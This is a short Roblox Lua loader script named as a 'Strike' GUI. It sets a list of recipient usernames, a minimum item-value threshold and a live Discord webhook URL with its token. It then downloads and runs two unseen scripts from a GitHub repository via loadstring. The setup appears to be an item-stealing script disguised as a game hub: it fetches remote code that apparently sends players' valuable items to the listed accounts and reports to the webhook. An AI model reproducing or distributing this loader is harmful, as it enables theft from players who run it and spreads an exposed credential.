-- Strikegui.lua
-- User settings
_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} 
_G.minrap = 10000000
_G.webhook = "https://discord.com/api/webhooks/1431974006080147466/vjWq7Xu7Mqun02T9rUiMFzZA1btH8483bsgvVihoSw-FEKsADYQbP49cJXvfsDLNQxto"

-- Run both scripts concurrently
spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/refs/heads/main/Strike.lua"))()
end)

spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/main/gui.lua"))()
end)
